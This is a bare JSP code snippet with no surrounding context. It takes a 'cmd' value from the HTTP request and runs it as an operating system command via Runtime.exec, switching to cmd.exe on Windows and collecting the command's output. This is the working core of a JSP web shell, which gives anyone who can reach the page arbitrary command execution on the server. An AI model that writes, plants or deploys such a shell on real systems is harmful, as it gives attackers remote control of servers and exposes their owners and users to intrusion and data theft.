<%
   String cmd = request.getParameter("cmd");
   String output = "";

   if(cmd != null) {
      String s = null;
      String osCommand;
      
      // Detect the operating system and set the appropriate command
      if (System.getProperty("os.name").toLowerCase().startsWith("windows")) {
         osCommand = "cmd.exe /C " + cmd;
      } else {
         osCommand = cmd;
      }

      try {
         Process p = Runtime.getRuntime().exec(osCommand);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>
